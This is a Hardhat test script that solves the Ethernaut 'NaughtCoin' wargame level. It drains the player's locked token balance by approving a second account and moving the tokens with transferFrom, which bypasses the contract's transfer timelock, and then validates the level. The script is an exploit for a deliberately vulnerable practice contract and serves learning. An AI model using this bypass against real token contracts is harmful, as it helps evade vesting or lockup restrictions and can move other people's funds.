import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("NaughtCoin Hack", () => {
  async function deployNaughtCoinFixture() {
    const [deployer, attacker, attacker2] = await ethers.getSigners();
    const NaughtCoinFactory = await ethers.getContractFactory("NaughtCoinFactory");
    const naughtCoinFactory = await NaughtCoinFactory.connect(deployer).deploy();
    await naughtCoinFactory.deployed();

    // We cannot get the return value of the state-changing function off-chain.
    // Simulate on-chain execution of the createInstance() to get the return value (the address of the deployed instance).
    const naughtCoinAddress = await naughtCoinFactory.connect(attacker).callStatic.createInstance(attacker.address);

    // Create Instance
    const tx = await naughtCoinFactory.connect(attacker).createInstance(attacker.address);
    await tx.wait();

    // Get deployed instance of GatekeeperTwo contract
    const naughtCoin = await ethers.getContractAt("NaughtCoin", naughtCoinAddress);

    return { attacker, attacker2, naughtCoinFactory, naughtCoin };
  }

  it("Should token balance to 0", async () => {
    const { attacker, attacker2, naughtCoinFactory, naughtCoin } = await loadFixture(deployNaughtCoinFixture);

    const attackerAddr = await attacker.getAddress();
    const attacker2Addr = await attacker2.getAddress();

    const attackerBalance = await naughtCoin.balanceOf(attackerAddr);

    // approve other address to spend tokens
    let tx = await naughtCoin.connect(attacker).approve(attacker2Addr, attackerBalance);
    await tx.wait();

    // transfer all tokens using approved address
    tx = await naughtCoin.connect(attacker2).transferFrom(attackerAddr, attacker2Addr, attackerBalance);
    await tx.wait();

    expect(await naughtCoin.balanceOf(attackerAddr)).to.be.equal(0, "Failed to drain the contract_1");
    expect(await naughtCoin.balanceOf(attacker2Addr)).to.be.equal(attackerBalance, "Failed to drain the contract_2");

    const success = await naughtCoinFactory.validateInstance(naughtCoin.address, attackerAddr);
    expect(success).to.be.true;
  });
});
